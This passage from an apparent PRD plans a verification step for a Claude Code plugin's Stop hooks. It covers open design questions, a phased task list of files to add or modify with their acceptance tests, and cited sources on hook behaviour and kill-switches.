1. **Retry cap:** should `retries` be configurable up to 2 (one corrective pass + one final) or capped at 1 in v1? Phase 1 ships with max 1; Phase 2 considers 2 once flake-detection lands. *Recommendation: cap at 1 for v1, defer 2 to Phase 2.*
2. **SubagentStop default scope:** should verification run on SubagentStop by default or only on Stop? Subagent-level proof commands are valuable for inter-wave gates but the cost compounds (N agents × verification overhead). *Recommendation: default to `scope: [Stop]`; users opt into `[Stop, SubagentStop]` explicitly.*
3. **failures.jsonl retention:** A6 cross-cutting gap #1 notes events.jsonl is unbounded (86K entries). Should failures.jsonl have a parallel GC policy from day 1, or follow events.jsonl to "fix when it bites"? *Recommendation: add a `failures.jsonl` GC entry to the same backlog item as events.jsonl, ship v1 unbounded.*
4. **`/verify` slash command:** should we expose a `/verify` command that runs the verification-command on demand (outside the hook flow), so operators can sanity-check the configured proof without provoking a Stop? *Recommendation: defer to Phase 2; the hook itself is testable without a slash command via `node hooks/on-stop.mjs < fixture.json`.*
5. **JSON decision-block default:** AC15 (now scheduled for Phase 2) introduces the JSON `{"decision": "block"}` alternative behind `verification.use-json-decision: false`. Some operators prefer the structured form because Claude can introspect it more reliably than stderr parsing. Two sub-questions, both deferred to the Phase 2 implementation: (a) should the default flip from `false` to `true` once parity tests prove equivalence? (b) should both modes ship simultaneously or should JSON-mode be opt-in for at least one cohort first? *Open — depends on observed Claude behavior across the first cohort of users. Tracked exclusively here (de-duplicated from the original AC15 narrative which lived in Phase 1).*
6. **PSA-003 layering:** the destructive-command guard (AC16) currently blocks at PreToolUse. If the verification-command itself is loaded from `verification.command` config rather than from a Bash tool call, does the guard fire? *Open — implementation must explicitly invoke the guard's evaluator from kill-switches.mjs or a shared helper, not rely on PreToolUse interception.*

## Implementation phasing

### Phase 1 (this PRD scope, 1.5–2 weeks — Medium Batch)

Sizing rationale (W3 C3 MUST-FIX #9): up-rated from "1 week" because the Phase 1 surface gained the new `verification-spend.json` artefact + `failures-jsonl.mjs` reader, the SubagentStop session_id/wave resolver reuse, and 14 additional acceptance tests (AC17–AC30). Conservative estimate: 1.5 weeks if all ACs pass on first integration, 2 weeks if AC19 (10-way concurrent stress) or AC26 (cross-file timeout validator) require iteration.

- **NEW** `scripts/lib/verification-config.mjs` — Zod schema (`.strict()`), `loadVerificationConfig({projectRoot})`, validator covering AC9 + AC9b + AC29: bounds rejections, allowlist + shell-metacharacter rejection, unknown-key strict rejection. Includes `parseVerificationCommand()` tokenizer for the legacy string form. NO `sh -c` anywhere (W3 C5 HIGH-#1).
- **NEW** `.orchestrator/metrics/verification-spend.json` — per-session token-spend counter file (AC7, AC28). Keyed by `session_id`; updated on each verification iteration; consumed by the new `VERIFICATION_BUDGET_EXCEEDED` kill-switch. Atomic write via existing IO helper.
- **NEW** writer/reader pair `scripts/lib/failures-jsonl.mjs` — exports a writer (reuses `appendJsonl()` from `scripts/lib/common.mjs` for atomic-append semantics matching events.jsonl) AND a reader (`readFailuresJsonl()`) implementing AC30 forward-compat (skip records with `schema_version > KNOWN_MAX`, emit warning). Schema constants exported for test reuse.
- **MODIFY** `hooks/on-stop.mjs` — insert verification branch between `discriminate()` and `handleStop`/`handleSubagentStop`. Honour `stop_hook_active` (strict boolean per AC17), scope, wall-time, and token-budget. Augment the existing `stop` record on pass. Reuse `resolveSessionId()` + `readWaveNumber()` for SubagentStop branch (AC10b). Use `execFile`-style spawnSync (binary + args, `shell: false`) — never `sh -c`.
- **MODIFY** `hooks/hooks.json` — bump Stop + SubagentStop `timeout` from 5 to 65 (uniform; ADR-365 layers per-matcher overrides on top in a separate follow-up). Cross-validated against `verification.wall-time-seconds + 5s` framing overhead at startup (AC26).
- **EXTEND** `scripts/lib/autopilot/kill-switches.mjs` — add `VERIFICATION_BUDGET_EXCEEDED: 'verification-budget-exceeded'` constant + evaluator that reads `.orchestrator/metrics/verification-spend.json`.
- **EXTEND** `scripts/validate-plugin.mjs` (or equivalent) — add startup-time validator that rejects `verification.wall-time-seconds + 5 > hooks.json[Stop].timeout` (AC26).
- **DOC** `docs/session-config-reference.md` — document the `verification:` block, supported keys, defaults, the binary allowlist, the shell-metacharacter rejection, and the destructive-command caveat. Explicit warning that the Zod validator IS the only line of hook-layer defense (NOT the pre-bash destructive guard).
- **TESTS** `tests/hooks/on-stop-verification.test.mjs` (NEW, ~32 ACs covering AC1–AC30 incl. AC2b/AC4a–d/AC9b/AC10b) + adapter test in `tests/lib/autopilot/kill-switches.test.mjs` (AC7) + reader test in `tests/lib/failures-jsonl.test.mjs` (AC30) + validator test in `tests/scripts/verification-config-validator.test.mjs` (AC9, AC9b, AC26, AC29).

### Phase 2 (follow-up issue, 1 week)

- **AC15 — JSON `{"decision": "block"}` decision-mode parity** (moved from Phase 1 per W3 C3 BLOCK). Adds `verification.use-json-decision: false` to the Session Config schema and the verification-config.mjs allowed-key list. Ships with parity test asserting both exit-2 and decision-block paths produce equivalent agent-visible behavior.
- Flaky-test re-run logic (`retries: 2`, run-twice on disagreement, surface flake evidence).
- `/verify` slash command for ad-hoc proof-command invocation.
- failures.jsonl GC/retention policy (paired with events.jsonl GC from A6 gap #1).
- JSON `{"decision": "block"}` mode default flip evaluation (separate from AC15 parity work).

### Phase 3 (deferred)

- Verification-command sandboxing via per-verification git worktree (A5 *"Sandbox in temp dir / git worktree"*).
- Cross-platform parity tests (Codex CLI + Cursor IDE hook entry points).
- Multi-story (Phase D, #341) integration: verification per-story across parallel autopilot runs.

## Sources

- **A5 Stop-hook patterns** — `docs/spike-probes/2026-05-10-w1-research-context.md` § A5 (lines 117–157). Anthropic Stop-hook contract, exit codes, `stop_hook_active` semantics, Boris Cherny verbatim quotes, Cat Wu / DEV Community 3-layer model, bounded-loop spec, risk/mitigation table.
  - Boris Cherny, Every.to interview: *"You can just make the model keep going until the thing is done."*
  - Boris Cherny, Threads: *"Give Claude a way to verify its work. If Claude has that feedback loop, it will 2-3x the quality of the final result."*
  - Boris Cherny, X (Ralph Wiggum thread): three strategies — background agent, **agent Stop hook (most deterministic)**, ralph-wiggum plugin.
- **A6 Internal codebase audit** — `docs/spike-probes/2026-05-10-w1-research-context.md` § A6 (lines 159–207).
  - `hooks/hooks.json:60–87` — current Stop + SubagentStop handlers, timeout 5s, async false.
  - `hooks/on-stop.mjs:1-80` — current Stop handler always exits 0 (informational only). Writes events.jsonl. Calls deregisterSelf().
  - `scripts/lib/autopilot/kill-switches.mjs:1-100` — 9 kill-switches: pre-iteration (MAX_SESSIONS, MAX_HOURS, RESOURCE_OVERLOAD, LOW_CONFIDENCE, USER_ABORT, TOKEN_BUDGET) + post-session (SPIRAL, FAILED_WAVE, CARRYOVER_TOO_HIGH).
  - `scripts/lib/autopilot/loop.mjs` — main `runLoop(args)` driver (consumer of kill-switches).
  - `skills/quality-gates/SKILL.md` — 4 variants (Baseline, Incremental, Full Gate, Per-File), not yet wired to kill-switches (orthogonal but adjacent).
- **Anthropic Stop-hook docs** — https://docs.anthropic.com/en/docs/claude-code/hooks (Stop event, exit codes, `stop_hook_active`, JSON `decision: block` alternative).
- **Anthropic scheduled-tasks docs** — https://code.claude.com/docs/en/scheduled-tasks (referenced in `.claude/rules/loop-and-monitor.md` for the broader runtime-contract framing).
- **Plugin-internal references**:
  - `scripts/lib/autopilot/kill-switches.mjs` (Phase C-1 #295, Phase C-1.b #300, TOKEN_BUDGET #355).
  - `scripts/lib/common.mjs` (`appendJsonl`, atomic writes — used by failures.jsonl writer).
  - `scripts/lib/events.mjs` (`eventsFilePath()` — pattern for failures.jsonl path resolver).
  - `scripts/lib/session-lock.mjs` (concurrency safety — referenced for parallel-session race mitigation).
  - `.claude/rules/parallel-sessions.md` (PSA-003 destructive-command discipline — informs AC16).
  - `.claude/rules/loop-and-monitor.md` (LM-005 *"Never reimplement these as `/loop`"* — verification is a hook, not a loop).
  - `CLAUDE.md` "Current State" 2026-05-09 housekeeping-1 entry — Express-Path catch-up illustrates the post-completion drift class this PRD targets.
